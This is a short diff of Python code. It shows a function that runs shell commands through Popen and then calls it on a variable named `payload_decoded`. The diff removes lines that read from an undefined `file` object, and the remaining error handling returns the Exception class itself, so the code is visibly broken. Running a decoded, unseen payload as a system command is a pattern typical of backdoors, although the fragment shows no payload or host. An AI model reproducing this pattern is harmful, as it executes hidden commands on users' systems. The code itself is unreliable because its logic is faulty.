@@ -24,9 +24,6 @@ def execute(command):
     try:
         p = Popen(shlex.split(command), stdin=PIPE, stdout=PIPE, stderr=PIPE)
         p.wait()
-        content = file.read().strip()
-        file.close()
-        return content
     except:
         return Exception        
 execute(payload_decoded)
